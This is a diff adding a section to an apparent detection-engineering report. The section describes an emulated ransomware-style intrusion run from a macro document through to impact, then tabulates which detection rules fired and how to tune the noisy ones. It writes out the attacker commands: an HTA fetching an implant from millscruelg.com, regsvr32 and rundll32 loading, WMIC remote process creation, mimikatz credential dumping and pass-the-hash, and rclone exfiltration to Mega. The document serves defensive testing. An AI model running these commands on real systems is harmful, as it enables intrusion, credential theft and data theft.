@@ -213,3 +213,75 @@ process or to have an injected module would remove the noise.
   single-event rule.
 
 
+
+## Full run from the delivery document (2026-10-25)
+
+This run starts at the delivery document and ends at the impact stage. Evidence for it is in
+[`telemetry/run-2026-10-25.json`](telemetry/run-2026-10-25.json).
+
+### Execution
+
+1. `decree-08.03.2021.docm` is opened by `duc.user` on WS01. Its `AutoOpen` writes
+   `compareforfor.hta` to the user profile and starts `cmd.exe /c mshta <hta>`.
+2. The HTA fetches `http://millscruelg.com/compareForfor.jpg` (the implant, served from 192.168.50.100)
+   and runs `regsvr32` on it. The beacon connects back over TLS and runs as `duc.user`.
+3. A private service host, `svchost.exe -k c0015grp -p`, loads the stage stub, which starts
+   `rundll32.exe C:\Users\Public\compareForfor.jpg DllRegisterServer` as SYSTEM.
+4. The injector writes the shellcode into `winlogon.exe`; the session that follows runs as SYSTEM.
+5. Discovery runs from that session: `whoami`, `nltest`, `tasklist /s FS01`, `net view /all /domain`.
+6. `wmic /node:FS01 process call create "rundll32.exe C:\ProgramData\143.dll DllRegisterServer"`
+   creates the loader on the backup server through `WmiPrvSE.exe`.
+7. `mk.exe privilege::debug sekurlsa::logonpasswords` runs from that `rundll32.exe` session and
+   returns the NT hash of `bk.admin`.
+8. `sekurlsa::pth` from the winlogon session produces a process on FS01 and a `4624` type 3 NTLM
+   logon for `bk.admin`.
+9. The injector writes the shellcode into a service host on FS01.
+10. `rclone` copies the corpus to `Mega:DATA` (28 new objects, 68 total) and the locker renames 40
+    files and writes five notes.
+
+### What fired
+
+Fourteen rules alerted in the ninety minute window.
+
+| Rule | Alerts |
+|---|---|
+| service host egress | 168 |
+| lsass access read mask | 59 |
+| dns nxdomain retry | 32 |
+| winlogon discovery burst | 15 |
+| svchost spawns rundll32 | 12 |
+| winlogon spawns shell | 6 |
+| office spawns shell | 4 |
+| rundll32 unsigned module | 4 |
+| mshta spawns loader | 2 |
+| regsvr32 unsigned image | 2 |
+| thread into system process | 2 |
+| wmic remote process create | 2 |
+| wmiprvse spawns loader | 2 |
+| rclone cloud transfer | 1 |
+
+The three entry rules that had no data in the previous run, `office spawns shell`, `mshta spawns
+loader` and `regsvr32 unsigned image`, all fire here. The chain is now covered end to end.
+
+### Noise in this run
+
+Three rules dominate the volume: service host egress (168), LSASS access (59) and DNS retry (32).
+
+- `service host egress` counts every outbound connection a service host makes, including update and
+  telemetry traffic. The domain filter does not help when the destination is an IP literal, which is
+  how Sysmon reports most of them. It needs an allow list of expected service endpoints or a
+  correlation rule that requires an unsigned module in the same host.
+- `lsass access read mask` fired 59 times because the agent and the operating system open LSASS for
+  their own reasons, with the same access mask a dump uses. Requiring the source image to be outside
+  `System32` and outside the agent directories removes most of them.
+- `dns nxdomain retry` fires on every failed lookup, and Windows produces many. It should be scoped
+  to the campaign names or to a burst of failures from one process.
+
+### Deviations recorded for this run
+
+- The service host on FS01 that receives the injection is `svchost.exe -k netsvcs`, because no user
+  session exists on the server and therefore no `CDPUserSvc` instance to target.
+- The exfiltration reads the local corpus path rather than the share, because a SYSTEM process on
+  FS01 cannot read its own share over the loopback.
+- The pass-the-hash helper runs through a batch file, so the process tree gains one `cmd.exe` between
+  `winlogon.exe` and `mk.exe`.
